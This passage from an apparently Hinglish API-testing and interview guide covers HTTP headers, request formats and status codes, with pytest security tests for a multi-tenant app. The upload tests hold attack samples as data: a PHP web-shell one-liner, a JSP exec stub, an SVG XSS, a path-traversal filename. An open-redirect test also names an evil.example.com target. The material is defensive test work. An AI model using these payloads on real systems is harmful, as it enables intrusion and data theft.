        f"{BASE_URL}/api/v1/budgets/{budget_id}/carve",
        data='{"scopeId":"sc_884","amount":250000}',
        headers={**api.auth_headers, "Content-Type": "text/plain"},
        timeout=30,
    )
    assert r.status_code == 415, (
        f"text/plain ke saath JSON accept ho gaya ({r.status_code}) — "
        "ye CORS preflight bypass karke CSRF ka rasta kholta hai"
    )


def test_missing_content_type_on_json_body(api, budget_id):
    """Content-Type bilkul na bheja jaye to? 400 ya 415 acceptable.
    500 nahi — wo unhandled parsing exception ka signal hai."""
    r = requests.post(
        f"{BASE_URL}/api/v1/budgets/{budget_id}/carve",
        data='{"scopeId":"sc_884","amount":250000}',
        headers=api.auth_headers,   # no Content-Type
        timeout=30,
    )
    assert r.status_code in (400, 415)
    assert r.status_code != 500
```

### Accept — response ka format maangna

Ye batata hai ki **main kya wapas chahta hoon**. Content negotiation.

```http
Accept: application/json
Accept: application/json, text/plain;q=0.9, */*;q=0.1
```

`q` = quality/preference weight, 0 se 1.

**Bug pattern:** `Accept: application/xml` bhejo jab API sirf JSON deti hai. Sahi behaviour
= `406 Not Acceptable`. Common bug = server JSON hi bhej deta hai `Content-Type:
application/json` ke saath, ya 500 de deta hai.

```python
def test_unsupported_accept_returns_406_or_json(api, sale_id):
    r = requests.get(f"{BASE_URL}/api/v1/sales/{sale_id}",
                     headers={**api.auth_headers, "Accept": "application/xml"}, timeout=30)
    # 406 ideal hai. JSON dena bhi practical hai. 500 kabhi nahi.
    assert r.status_code in (200, 406)
    if r.status_code == 200:
        assert "json" in r.headers["Content-Type"]
```

**Ek aur important test:** kya `Accept` header response ko kisi unexpected format mein daal
sakta hai? `Accept: text/html` bhejne pe kuch Spring apps HTML error page return kar dete
hain jisme **stack trace** hota hai — jabki JSON path pe clean error aata hai.

```python
@pytest.mark.security
def test_accept_html_does_not_leak_stack_trace(api):
    """Spring Boot ka default error page HTML mein hota hai aur usme
    stack trace ho sakta hai. API clients JSON maangte hain, isliye
    ye path aksar untested reh jaata hai."""
    r = requests.get(f"{BASE_URL}/api/v1/sales/does-not-exist",
                     headers={**api.auth_headers, "Accept": "text/html"}, timeout=30)
    body = r.text.lower()
    for leak in ("java.lang", "org.springframework", "at com.merlin", "caused by",
                 "mongodb", "stacktrace"):
        assert leak not in body, f"Stack trace leak HTML error page mein: '{leak}'"
```

### Authorization

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...     # JWT / OAuth token
Authorization: Basic cml0aWs6cGFzc3dvcmQ=         # base64(user:pass) — NOT encryption
Authorization: ApiKey abc123                       # non-standard but common
Authorization: Digest username="...", realm="..."  # legacy
```

Detail Part 5 mein.

### Custom X- headers

`X-` prefix historically "non-standard" ke liye tha. RFC 6648 ne isko deprecate kar diya
(kyunki jab header standard ban jaata hai to naam badalna padta hai) — lekin practically
sab abhi bhi use karte hain.

| Header | Kya karta hai | QA kyun care kare |
|---|---|---|
| `X-Request-Id` / `X-Correlation-Id` | Request ko logs mein trace karna | **Har test se bhejo.** Fail hone pe bug report mein ye id daalo — dev ko seedha log mil jaata hai |
| `X-Forwarded-For` | Original client IP (proxy ke peeche) | **Spoofable.** Agar rate limiting isi pe based hai, spoof karke bypass ho sakta hai |
| `X-Forwarded-Proto` | Original scheme (http/https) | Redirect logic isse decide hoti hai — spoof se open redirect ban sakta hai |
| `X-Tenant-Id` / `X-Org-Id` | Multi-tenant routing | **Sabse bada test target** — kya main isse badal ke doosre org ka data le sakta hoon? |
| `X-Api-Version` | Header-based versioning | Purana version abhi bhi kaam kar raha hai? |
| `X-RateLimit-*` | Rate limit budget | Assert karo ki ye headers aate hain |
| `X-Idempotency-Key` / `Idempotency-Key` | Duplicate prevention | Retry safety |

> **[REAL]** Merlin multi-tenant hai, org-scoped. Iska matlab **har single test** mein ek
> question hai: agar main org identifier ko manipulate karoon, kya main doosre org ka data
> dekh sakta hoon? Ye teen jagah se aa sakta hai — JWT claim, header, ya request body. Teeno
> test karne chahiye.

```python
@pytest.mark.security
def test_org_scoping_cannot_be_overridden_by_header(api, other_org_project_id):
    """Multi-tenant ka sabse important test.
    Org identity JWT se aani chahiye — header se override nahi honi chahiye."""
    r = api.get(f"/api/v1/projects/{other_org_project_id}/sales",
                headers={"X-Org-Id": OTHER_ORG_ID})
    assert r.status_code in (403, 404), (
        f"X-Org-Id header se cross-org access mil gaya ({r.status_code}) — "
        "tenant isolation toot gayi"
    )


@pytest.mark.security
def test_org_scoping_cannot_be_overridden_by_body(api, budget_id):
    """Body mein orgId bhejne se server ka scoping override nahi hona chahiye.
    Ye 'mass assignment' bug ka tenant version hai."""
    r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                 json={"scopeId": "sc_1", "amount": 1000, "orgId": OTHER_ORG_ID})
    if r.status_code in (200, 201):
        created = r.json()
        assert created.get("orgId") != OTHER_ORG_ID, "Body se orgId override ho gaya"
```

### Idempotency-Key

```http
POST /api/v1/budgets/b_1/carve
Idempotency-Key: 3f9a1c22-77bd-4a0e-91cc-5e2b8d0f1a44
```

Client UUID generate karta hai. Server key + result store karta hai. Same key se dobara aane
pe **execute nahi karta**, stored result return karta hai. Network timeout ke baad safe retry
possible ho jaata hai. Detail Part 8 mein.

### Conditional headers

| Header | Kya |
|---|---|
| `If-None-Match: "abc"` | "Sirf tab bhejo jab ETag badal gaya ho" → 304 |
| `If-Match: "abc"` | "Sirf tab update karo jab version abhi bhi ye hai" → 412 — **optimistic locking** |
| `If-Modified-Since` | Timestamp-based cache validation |
| `If-Unmodified-Since` | Timestamp-based conditional write |

`If-Match` sabse valuable hai QA ke liye — ye **lost update problem** solve karta hai:

```
Bina If-Match:
  User A: GET sale (totalPrice = 100)
  User B: GET sale (totalPrice = 100)
  User A: PATCH totalPrice = 150   -> saved
  User B: PATCH totalPrice = 200   -> saved, A ka change chala gaya

If-Match ke saath:
  User A: GET sale -> ETag "v1"
  User B: GET sale -> ETag "v1"
  User A: PATCH If-Match: "v1"  -> 200, naya ETag "v2"
  User B: PATCH If-Match: "v1"  -> 412 Precondition Failed
                                    B ko pata chal gaya ki data badal gaya
```

```python
def test_optimistic_locking_prevents_lost_update(api, sale_id):
    """Do users same resource edit kar rahe hain. Doosre ko 412 milna chahiye,
    silently overwrite nahi hona chahiye."""
    r1 = api.get(f"/api/v1/sales/{sale_id}")
    etag = r1.headers.get("ETag")
    if not etag:
        pytest.skip("API ETag support nahi karti — ye khud ek finding hai")

    a = api.patch(f"/api/v1/sales/{sale_id}", json={"notes": "A ka edit"},
                  headers={"If-Match": etag})
    assert a.status_code in (200, 204)

    b = api.patch(f"/api/v1/sales/{sale_id}", json={"notes": "B ka edit"},
                  headers={"If-Match": etag})   # stale etag
    assert b.status_code == 412, (
        f"Stale ETag ke saath update ho gaya ({b.status_code}) — lost update possible"
    )
```

## 3.2 Path params vs Query params vs Body — kaunsa kab

Ye design question hai, aur senior interview mein "is API ka design theek hai?" pooch sakte
hain.

| Kahan | Kab use karo | Kab galat hai | Merlin example |
|---|---|---|---|
| **Path param** | Resource ko **identify** karta hai. Hierarchy mein fits. Required hai. | Optional cheez ke liye. Filter ke liye. | `/api/v1/sales/{id}/spine` — `id` sale identify kar raha hai |
| **Query param** | **Filter, sort, paginate, search, projection.** Optional. Resource identity nahi badalta. | Secrets ke liye (logs mein jaata hai). Bade payloads ke liye (URL length limit ~2048-8192). | `/api/v1/projects/{id}/sales?status=OPEN&page=2&sort=-createdAt` |
| **Body** | Data jo **create/update** karna hai. Complex nested structures. Secrets. Bada payload. | GET ke saath (proxies drop kar sakte hain, cache confuse hota hai). | `POST /api/v1/budgets/{id}/carve` ka `{scopeId, amount, currency}` |
| **Header** | **Metadata** about the request — auth, format, tracing, idempotency. | Business data ke liye. | `Authorization`, `X-Request-Id`, `Idempotency-Key` |

**Decision rule (ye interview mein bol sakte ho):**

```
Kya ye cheez batati hai KAUNSA resource?          -> path param
Kya ye batati hai KITNE/KAUNSE SE/KIS ORDER MEIN? -> query param
Kya ye resource ka NAYA CONTENT hai?              -> body
Kya ye request ke BAARE mein hai, content nahi?   -> header
```

**Design smells jo QA flag kar sakta hai:**

```
/api/v1/getSale?id=s_1              # verb URL mein — Level 0/1 REST
/api/v1/sales/s_1/delete            # action as path, GET pe khula ho to CSRF
/api/v1/sales?id=s_1                # identity query param mein — 404 vs empty list confusion
/api/v1/sales/s_1?orgId=org_2       # scoping client se aa rahi hai — tenant bypass risk
/api/v1/verify?token=eyJhbGci...    # secret URL mein — logs leak
POST /api/v1/sales/search  {...}    # GET ke bajay POST search — acceptable jab filter complex
                                      ho, lekin phir caching manually handle karni padegi
```

Wo aakhri wala interesting hai — **complex search POST pe karna legitimate pattern hai** (kyunki
URL length limit hai aur nested filters query string mein bharna painful hai), lekin trade-off
ye hai ki ab response cacheable nahi rahi aur GET ki safety chali gayi. Ye batana senior-level
nuance dikhata hai.

## 3.3 Request body formats — code ke saath

### JSON

```python
# requests json= use karo, data=json.dumps() nahi
# json= automatically Content-Type: application/json set karta hai
r = requests.post(url, json={"scopeId": "sc_884", "amount": 250000}, timeout=30)

# data= use karoge to Content-Type khud dena padega
r = requests.post(url,
                  data=json.dumps({"scopeId": "sc_884"}),
                  headers={"Content-Type": "application/json"},
                  timeout=30)
```

**JSON edge cases jo test karne chahiye:**

```python
@pytest.mark.parametrize("body,description", [
    ('{"amount": 250000,}',              "trailing comma — invalid JSON"),
    ('{"amount": 250000',                "unclosed brace"),
    ("{'amount': 250000}",               "single quotes — invalid JSON"),
    ('{"amount": NaN}',                  "NaN — JS deta hai, JSON spec mein nahi"),
    ('{"amount": Infinity}',             "Infinity"),
    ('',                                 "empty body"),
    ('null',                             "literal null as whole body"),
    ('[]',                               "array jahan object expected"),
    ('{"amount": 1e400}',                "number overflow"),
    ('{"a":{"a":{"a":{"a":{"a":1}}}}}',  "deep nesting"),
])
def test_malformed_json_returns_400_never_500(api, budget_id, body, description):
    """Malformed JSON ka jawab 400 hona chahiye, 500 kabhi nahi.
    500 ka matlab hai unhandled exception — aur unhandled exceptions
    aksar stack trace ke saath aate hain."""
    r = requests.post(f"{BASE_URL}/api/v1/budgets/{budget_id}/carve",
                      data=body,
                      headers={**api.auth_headers, "Content-Type": "application/json"},
                      timeout=30)
    assert r.status_code == 400, f"{description}: expected 400, got {r.status_code}"
    assert "Exception" not in r.text and "at com." not in r.text, \
        f"{description}: stack trace leak ho raha hai"
```

**Aur ek serious one — JSON duplicate keys:**

```python
@pytest.mark.security
def test_duplicate_json_keys_behaviour(api, budget_id):
    """{"amount": 100, "amount": 999999} — JSON spec isko undefined chhodta hai.
    Alag parsers alag behave karte hain: pehla lete hain, aakhri lete hain, ya error dete hain.
    Agar validation layer aur business layer alag parsers use karte hain,
    attacker validation ko 100 dikha ke business ko 999999 process karwa sakta hai.
    Ye ek real attack class hai."""
    r = requests.post(f"{BASE_URL}/api/v1/budgets/{budget_id}/carve",
                      data='{"scopeId":"sc_1","amount":100,"amount":999999}',
                      headers={**api.auth_headers, "Content-Type": "application/json"},
                      timeout=30)
    if r.status_code in (200, 201):
        # Kaunsa value actually save hua? Kabhi bhi 999999 nahi hona chahiye
        assert r.json()["amount"] == 100, \
            "Duplicate key mein last-wins hua — parser inconsistency ka risk"
```

### form-urlencoded

```python
# Content-Type: application/x-www-form-urlencoded
# Body: scopeId=sc_884&amount=250000&currency=INR
r = requests.post(url, data={"scopeId": "sc_884", "amount": 250000}, timeout=30)
```

Kahan milta hai: HTML form submits, **OAuth 2.0 token endpoint** (spec isi ko mandate karta
hai), legacy APIs.

Limitation: flat key-value only. Nesting ke liye conventions (`a[b]=c`) use hote hain jo
har framework mein alag hain.

### multipart/form-data — file upload

```python
def test_upload_document_to_sale(api, sale_id, tmp_path):
    """multipart mein file aur normal fields dono ja sakte hain.
    requests ka files= parameter automatically boundary set karta hai —
    Content-Type manually set MAT karo, boundary galat ho jayega."""
    pdf = tmp_path / "contract.pdf"
    pdf.write_bytes(b"%PDF-1.4\n%fake pdf for test\n")

    with open(pdf, "rb") as fh:
        r = requests.post(
            f"{BASE_URL}/api/v1/sales/{sale_id}/documents",
            files={"file": ("contract.pdf", fh, "application/pdf")},
            data={"documentType": "CONTRACT", "notes": "signed copy"},  # normal fields
            headers=api.auth_headers,   # Content-Type NAHI dena
            timeout=60,
        )
    assert r.status_code == 201
```

**File upload ke security tests — ye har QA ko karne chahiye:**

```python
@pytest.mark.security
@pytest.mark.parametrize("filename,content,content_type,should_reject", [
    ("evil.exe",         b"MZ\x90\x00",         "application/octet-stream", True),
    ("evil.php",         b"<?php system($_GET['c']); ?>", "application/x-php", True),
    ("shell.jsp",        b"<% Runtime.getRuntime().exec(...) %>", "text/plain", True),
    ("evil.pdf.exe",     b"MZ",                 "application/pdf",  True),   # double extension
    ("../../../etc/passwd", b"root:x:0:0",      "text/plain",       True),   # path traversal
    ("evil.svg",         b"<svg onload=alert(1)>", "image/svg+xml", True),   # stored XSS
    ("fake.pdf",         b"MZ\x90\x00",         "application/pdf",  True),   # magic bytes mismatch
    ("real.pdf",         b"%PDF-1.4\n",         "application/pdf",  False),
])
def test_file_upload_validation(api, sale_id, filename, content, content_type, should_reject):
    """Upload validation extension pe nahi, MAGIC BYTES pe honi chahiye.
    Aur filename sanitize hona chahiye — path traversal se server ki koi bhi file
    overwrite ho sakti hai."""
    r = requests.post(
        f"{BASE_URL}/api/v1/sales/{sale_id}/documents",
        files={"file": (filename, content, content_type)},
        data={"documentType": "CONTRACT"},
        headers=api.auth_headers, timeout=60)

    if should_reject:
        assert r.status_code in (400, 415, 422), \
            f"'{filename}' accept ho gaya ({r.status_code}) — upload validation weak hai"
    else:
        assert r.status_code == 201


@pytest.mark.security
def test_uploaded_file_is_served_with_safe_headers(api, uploaded_doc_url):
    """Upload hone ke baad file kaise serve hoti hai, wo bhi utna hi important hai.
    HTML/SVG inline serve hui to stored XSS ban jaata hai."""
    r = api.get(uploaded_doc_url)
    assert r.headers.get("X-Content-Type-Options") == "nosniff", \
        "nosniff missing — browser content sniff karke HTML execute kar sakta hai"
    disposition = r.headers.get("Content-Disposition", "")
    assert "attachment" in disposition, \
        "File inline serve ho rahi hai — SVG/HTML se stored XSS possible"


def test_upload_size_limit_enforced(api, sale_id):
    """Bada file 413 dena chahiye, timeout ya 500 nahi."""
    big = b"x" * (100 * 1024 * 1024)   # 100 MB
    r = requests.post(f"{BASE_URL}/api/v1/sales/{sale_id}/documents",
                      files={"file": ("big.pdf", big, "application/pdf")},
                      data={"documentType": "CONTRACT"},
                      headers=api.auth_headers, timeout=120)
    assert r.status_code == 413, f"100MB upload pe {r.status_code} — size limit nahi hai"
```

### Raw / binary

```python
r = requests.post(url, data=open("scan.pdf", "rb").read(),
                  headers={**auth, "Content-Type": "application/pdf"}, timeout=60)
```

> **Interview answer (headers and params):**
>
> "I think of a request in four channels, and each has a correct purpose. Path parameters
> identify which resource — they're required and hierarchical, like
> `/api/v1/sales/{id}/spine`. Query parameters modify the view of a collection — filter, sort,
> paginate, search — they're optional and they don't change resource identity. The body
> carries the new content, complex structures, and anything secret. Headers carry metadata
> about the request rather than its content — authentication, content negotiation, tracing,
> idempotency.
>
> Two headers I treat as test targets rather than plumbing. First, `Content-Type`: I always
> send a JSON body with `Content-Type: text/plain` and expect a 415. If the server accepts it,
> it's ignoring the declared type, and that matters beyond correctness — simple content types
> don't trigger a CORS preflight, so an endpoint that accepts `text/plain` can be hit
> cross-origin by a form-based CSRF that a JSON-only endpoint would have blocked.
>
> Second, in our multi-tenant system, anything that could carry tenant identity. Org scoping
> must come from the JWT and must not be overridable. So I test the same thing three ways: an
> `X-Org-Id` header pointing at another org, an `orgId` field in the body, and an org id in a
> query parameter. All three must be ignored, and cross-org resources must return 403 or 404.
> That's one test class I'd run against every endpoint, not just a few."

> **Cross-question: "Why shouldn't a GET have a body?"**
>
> "The specification doesn't forbid it, but it says the body has no defined semantics, and in
> practice the ecosystem breaks. Some proxies and CDNs strip the body, some HTTP clients
> refuse to send one, and caching keys off the URL, so two GETs with different bodies collide
> in the cache and return each other's data. If a filter genuinely doesn't fit in a query
> string — deeply nested criteria, or something past the URL length limit — the honest answer
> is a POST to a `/search` sub-resource. You lose cacheability and safety, so you make that
> trade explicitly rather than by pretending a GET body will work."

> **Cross-question: "Give me a bug you'd only find by manipulating headers."**
>
> "The CORS preflight one. If `OPTIONS` requires authentication, everything works perfectly
> from curl and from Postman, and every browser-based cross-origin call fails — because
> browsers deliberately send the preflight without credentials. It's invisible to any test
> that isn't sending an actual preflight, and it usually shows up as 'the API works but the
> frontend can't call it', which then gets misdiagnosed as a frontend bug."

---

# PART 4 — Status Codes

## 4.1 Pehla principle — status code sabse **kamzor** assertion hai

Ye baat interview mein bolna aapko turant senior bana deta hai.

Status code sirf ek 3-digit integer hai jo server ne choose kiya. Wo:
- Galat ho sakta hai (developer ne `return ok(...)` likh diya error path pe)
- Cache/gateway se aa sakta hai, app se nahi
- Sahi ho sakta hai jabki data poori tarah galat ho

> **[REAL]** Merlin mein ek customer-facing endpoint ne `200 OK` ke saath
> `{"totalPrice": null, "lineItems": []}` return kiya — ek aise contract ke liye jiski
> real signed value thi. Status code perfect tha. Data poora galat tha. Root cause: reader
> sirf estimate entity dekh raha tha, jabki frozen price **Sale** entity pe rehti thi.
> Koi bhi status-code-based test ise nahi pakad sakta tha.

**Isliye har test mein assertion ladder aisi honi chahiye:**

```
1. Status code       <- weakest. necessary, not sufficient
2. Content-Type      <- kya main sahi format parse kar raha hoon
3. Schema            <- structure sahi hai (types, required, no extras)
4. Business values   <- STRONGEST. kya value actually sahi hai
5. Side effects      <- DB/downstream mein sahi cheez hui?
6. Non-effects       <- jo NAHI hona chahiye tha wo nahi hua?
```

## 4.2 Class-wise overview

| Class | Naam | Matlab | QA ka default sawaal |
|---|---|---|---|
| **1xx** | Informational | Request mil gayi, process jaari | Rare. `100 Continue`, `101 Switching Protocols` (WebSocket upgrade) |
| **2xx** | Success | Request successful | **Kya body sach mein sahi hai?** |
| **3xx** | Redirection | Aur action chahiye | Redirect chain kitni lambi? Loop to nahi? Open redirect to nahi? |
| **4xx** | Client error | Client ne galti ki | Message helpful hai? Leak to nahi kar raha? |
| **5xx** | Server error | Server ne galti ki | **Har 5xx ek bug hai** jab tak proven na ho warna |

## 4.3 Exhaustive table — jo aapko pata hone chahiye

### 2xx — Success

| Code | Naam | Kab | QA kya test kare |
|---|---|---|---|
| **200** | OK | Generic success with body | Body sach mein sahi hai? Empty result 200 hi hona chahiye (404 nahi) |
| **201** | Created | Naya resource bana | **`Location` header hai?** Body mein naya id hai? Us URL pe GET kaam karta hai? |
| **202** | Accepted | Async — kaam baad mein hoga | Status/polling URL mila? Kaam actually hua ya chup-chaap drop ho gaya? |
| **204** | No Content | Success, kuch return nahi | **Body bilkul khaali hona chahiye** (`Content-Length: 0`). Kuch APIs 204 ke saath body bhej deti hain — clients crash karte hain |
| **206** | Partial Content | Range request | `Content-Range` sahi? Bade file downloads / video streaming |
| **207** | Multi-Status | WebDAV / batch ops | Batch mein kuch pass kuch fail — har item ka status |

### 3xx — Redirection

| Code | Naam | Kab | QA kya test kare |
|---|---|---|---|
| **301** | Moved Permanently | Permanent URL change | Method GET mein badal sakta hai (historic behaviour) — POST ke liye 308 use karo |
| **302** | Found | Temporary | Wahi method-change problem |
| **303** | See Other | POST ke baad GET pe bhejo | POST-Redirect-GET pattern |
| **304** | Not Modified | Cache valid hai | **Body nahi hona chahiye.** `ETag` match hone pe aata hai |
| **307** | Temporary Redirect | Temporary, **method preserve** | POST redirect ke baad bhi POST rehta hai |
| **308** | Permanent Redirect | Permanent, **method preserve** | 301 ka safe version |

```python
@pytest.mark.security
def test_no_open_redirect(api):
    """Agar redirect target user input se aata hai, attacker users ko
    apni site pe bhej sakta hai — phishing. Classic bug."""
    r = requests.get(f"{BASE_URL}/api/v1/auth/callback",
                     params={"redirect_uri": "https://evil.example.com/steal"},
                     allow_redirects=False, timeout=30)
    location = r.headers.get("Location", "")
    if r.status_code in (301, 302, 303, 307, 308):
        host = urlparse(location).netloc
        assert host in ("", "app.merlinai.co", "staging.merlinai.co"), \
            f"Open redirect: server ne {host} pe bheja"


def test_redirect_chain_is_short(api):
    """5 se zyada redirects = loop ka risk aur latency. Clients aksar 20 pe rukte hain."""
    r = requests.get(f"{BASE_URL}/api/v1/sales", headers=api.auth_headers,
                     allow_redirects=True, timeout=30)
    assert len(r.history) <= 2, f"{len(r.history)} redirects — chain bahut lambi"
```

### 4xx — Client errors

| Code | Naam | Kab | QA kya test kare |
|---|---|---|---|
| **400** | Bad Request | **Syntactically** galat — malformed JSON, missing required field, wrong type | 500 kabhi nahi aana chahiye malformed input pe. Message mein stack trace nahi |
| **401** | Unauthorized | **Authentication** fail — kaun ho ye nahi pata | `WWW-Authenticate` header hona chahiye. Missing/expired/invalid/malformed token — sab 401 |
| **403** | Forbidden | **Authorization** fail — pata hai kaun ho, permission nahi | Kya ye 404 hona chahiye? (neeche) |
| **404** | Not Found | Resource nahi mila | **Ya jaan-boojh ke chhupaya gaya** (neeche) |
| **405** | Method Not Allowed | Method support nahi | `Allow` header hona chahiye. State-changing endpoints GET pe 405 dein |
| **406** | Not Acceptable | `Accept` header satisfy nahi ho sakta | |
| **408** | Request Timeout | Client ne time pe request complete nahi ki | |
| **409** | Conflict | Current state ke saath conflict | Concurrency, duplicates, state machine violations (neeche) |
| **410** | Gone | Pehle tha, ab permanently nahi hai | 404 se better jab deprecation communicate karna ho |
| **411** | Length Required | `Content-Length` chahiye | |
| **412** | Precondition Failed | `If-Match` fail — optimistic locking | Lost update prevention |
| **413** | Payload Too Large | Body limit se bada | Bade upload pe timeout ya 500 nahi, 413 |
| **414** | URI Too Long | URL limit cross | Bahut saare query params / bade filters |
| **415** | Unsupported Media Type | `Content-Type` support nahi | Content-type confusion test |
| **418** | I'm a teapot | Joke (RFC 2324) | Interview trivia |
| **422** | Unprocessable Entity | **Syntax theek, semantics galat** | 400 vs 422 (neeche) |
| **423** | Locked | Resource locked hai | |
| **425** | Too Early | Replay risk — TLS 0-RTT | |
| **428** | Precondition Required | Server `If-Match` demand kar raha hai | Lost-update ko force-prevent karna |
| **429** | Too Many Requests | Rate limit | `Retry-After` hona chahiye (neeche) |
| **431** | Request Header Fields Too Large | Headers bade | Fat JWT ka classic symptom |
| **451** | Unavailable For Legal Reasons | Legal block | |

### 5xx — Server errors

| Code | Naam | Kab | QA kya test kare |
|---|---|---|---|
| **500** | Internal Server Error | Unhandled exception | **Har 500 ek bug hai.** Body mein stack trace / internal detail nahi honi chahiye |
| **501** | Not Implemented | Method server samajhta hi nahi | TRACE pe acceptable |
| **502** | Bad Gateway | Upstream ne invalid response diya | **Ye gateway se aata hai, app se nahi** — app logs mein kuch nahi milega |
| **503** | Service Unavailable | Temporarily down / overloaded | `Retry-After` hona chahiye. Deploy ke dauraan expected |
| **504** | Gateway Timeout | Upstream time pe jawab nahi diya | Round number pe (30s/60s) = proxy timeout, app logic nahi |
| **507** | Insufficient Storage | Disk full | |
| **508** | Loop Detected | Infinite loop | |

## 4.4 Deep dive — 401 vs 403 vs 404

Ye **sabse zyada poocha jaane wala** status code question hai, aur sabse zyada galat samjha
jaane wala.

### Basic definitions

| Code | Sawaal jiska jawab de raha hai | Analogy |
|---|---|---|
| **401 Unauthorized** | "**Tum kaun ho?**" — identity establish nahi hui | Building ke gate pe ID card nahi dikhaya |
| **403 Forbidden** | "**Tum ho kaun ho, lekin andar nahi ja sakte**" — identity theek, permission nahi | ID card dikhaya, lekin ye floor tumhare liye nahi |
| **404 Not Found** | "**Aisa kuch hai hi nahi**" | Us naam ka koi room hai hi nahi |

**Naming irony:** 401 ka naam "Unauthorized" hai lekin wo **authentication** ke baare mein
hai. 403 "Forbidden" **authorization** ke baare mein hai. Naam ulte hain — ye interview mein
bolna acha lagta hai.

### 401 kab

- Token bheja hi nahi
- Token expired
- Token malformed / signature invalid
- Token revoked
- Basic auth credentials galat

**401 ke saath `WWW-Authenticate` header aana chahiye** — spec ye demand karta hai:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api", error="invalid_token", error_description="Token expired"
```

### 403 kab

- Token valid hai, user identified hai — lekin role/permission nahi
- Account suspended
- IP allowlist se bahar
- Plan/subscription mein feature nahi hai

**Important:** 403 pe **re-authenticate karne se kuch nahi hoga**. 401 pe hoga. Yahi practical
difference hai — client 401 pe token refresh karta hai, 403 pe nahi.

```python
def test_401_triggers_refresh_403_does_not(api):
    """Client ke liye ye difference behavioural hai, cosmetic nahi.
    401 = token refresh karo aur retry karo.
    403 = retry karne ka koi fayda nahi, user ko batao."""
    expired = make_expired_token()
    r1 = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                      headers={"Authorization": f"Bearer {expired}"}, timeout=30)
    assert r1.status_code == 401, "Expired token pe 403 diya — client refresh nahi karega"
    assert "WWW-Authenticate" in r1.headers

    viewer = token_for_role("VIEWER")
    r2 = requests.post(f"{BASE_URL}/api/v1/sales/s_1/close",
                       headers={"Authorization": f"Bearer {viewer}"}, timeout=30)
    assert r2.status_code == 403, "Permission issue pe 401 diya — client infinite refresh loop mein fasega"
```

**Ye ek real production bug hai:** agar server permission-denied pe 401 deta hai, aur client
mein "401 pe token refresh karke retry karo" logic hai — to client **infinite loop** mein
chala jaata hai. Refresh successful hota hai, retry phir 401 deta hai, phir refresh... Ye
auth server ko DDoS kar deta hai.

### 404 kab **secure choice** hai

Ye sabse important nuance hai.

**Problem:** 403 information leak karta hai.

```
GET /api/v1/sales/s_9999   (dusre org ka sale)
-> 403 Forbidden

Attacker ne kya seekha: "s_9999 EXIST karta hai. Bas mera access nahi hai."
```

Ye ek **existence oracle** hai. Attacker ID space enumerate karke seekh sakta hai:
- Kaunse IDs valid hain
- Aapke system mein kitne records hain (sequential IDs ho to)
- Competitor ka data kis id range mein hai
- Kaunsa customer aapka client hai (email-based lookup pe)

**Solution:** cross-tenant / unauthorized resources ke liye **404 return karo**.

```
GET /api/v1/sales/s_9999   (dusre org ka)
-> 404 Not Found

Attacker ne kya seekha: kuch nahi. Ho sakta hai exist hi na karta ho.
```

**Decision rule — ye interview mein bolne layak hai:**

```
Kya user ko ye JAANNA chahiye ki resource exist karta hai?

  HAAN  -> 403 Forbidden
          Example: same org ka document, lekin VIEWER role hai aur edit chahiye.
          User jaanta hai document exist karta hai, wo folder mein dikh raha hai.
          403 helpful hai: "admin se access maango"

  NAHI  -> 404 Not Found
          Example: doosre org ka sale. Ya doosre user ka private record.
          Existence khud confidential information hai.
```

> **[REAL]** Merlin multi-tenant hai. Cross-org resource access pe **404 hi sahi choice hai**,
> 403 nahi — kyunki ek org ko ye jaanne ki koi zaroorat nahi ki doosre org ke paas kaunsi
> sale IDs hain. 403 dene ka matlab hoga ki koi bhi customer ID range scan karke competitor
> ke record count ka andaaza laga le.

```python
@pytest.mark.security
def test_cross_org_returns_404_not_403(api, other_org_sale_id, nonexistent_sale_id):
    """Cross-org resource aur non-existent resource ka response
    BILKUL identical hona chahiye — status, body, aur timing.
    Warna existence oracle ban jaata hai."""
    r_other = api.get(f"/api/v1/sales/{other_org_sale_id}")
    r_none = api.get(f"/api/v1/sales/{nonexistent_sale_id}")

    assert r_other.status_code == 404, (
        f"Cross-org pe {r_other.status_code} — existence leak ho raha hai"
    )
    assert r_other.status_code == r_none.status_code
    assert r_other.json() == r_none.json(), (
        "Error body alag hai — attacker body se distinguish kar sakta hai"
    )


@pytest.mark.security
def test_no_timing_oracle_between_existing_and_nonexistent(api, other_org_sale_id, nonexistent_sale_id):
    """Subtle version: status same hai lekin timing alag.
    Existing record pe DB lookup + permission check hota hai (slow),
    non-existent pe sirf lookup (fast). Attacker time naap ke distinguish kar leta hai."""
    import statistics

    def timings(sale_id, n=25):
        out = []
        for _ in range(n):
            t0 = time.perf_counter()
            api.get(f"/api/v1/sales/{sale_id}")
            out.append(time.perf_counter() - t0)
        return out

    med_other = statistics.median(timings(other_org_sale_id))
    med_none = statistics.median(timings(nonexistent_sale_id))
    ratio = max(med_other, med_none) / max(min(med_other, med_none), 1e-9)

    assert ratio < 1.5, (
        f"Timing difference {ratio:.2f}x — existence timing oracle. "
        f"cross-org={med_other*1000:.1f}ms, nonexistent={med_none*1000:.1f}ms"
    )
```

**Ek aur important place jahan 404 secure choice hai — login/password reset:**

```
POST /api/v1/auth/forgot-password  {"email": "ceo@competitor.com"}

GALAT: 404 "No account with this email"
       -> attacker ne confirm kar liya ki wo aapka customer nahi hai
       -> aur valid emails enumerate kar sakta hai

SAHI:  200 "If an account exists with this email, a reset link has been sent"
       -> chahe account ho ya na ho, same response, same timing
```

> **Interview answer (401 vs 403 vs 404):**
>
> "401 means authentication failed — the server doesn't know who you are. No token, expired
> token, bad signature, revoked token: all 401, and the response should carry a
> `WWW-Authenticate` header. 403 means authentication succeeded but authorization failed — the
> server knows exactly who you are and you're not allowed. The naming is famously backwards:
> 401 is called Unauthorized but it's about authentication, and 403 is called Forbidden but
> it's about authorization.
>
> The practical difference is what the client should do next. On 401, retrying after a token
> refresh makes sense. On 403, retrying is pointless. That's not academic — if a server
> returns 401 for a permission problem, and the client has the standard 'on 401, refresh and
> retry' interceptor, you get an infinite loop that hammers the auth server. I've seen that
> pattern described as an outage, and the root cause was a wrong status code.
>
> Then there's the case where 404 is deliberately the secure answer. Returning 403 for a
> resource that belongs to another tenant confirms that the resource exists — it's an
> existence oracle, and it lets someone enumerate ID space and infer how many records you have
> or who your customers are. Our system is multi-tenant and org-scoped, so for anything
> outside the caller's org I'd expect 404, not 403. My rule is: if the user is entitled to
> know the thing exists — same org, wrong role, and the item is already visible in their
> UI — 403 is right and more helpful. If the existence itself is confidential, 404. And when I
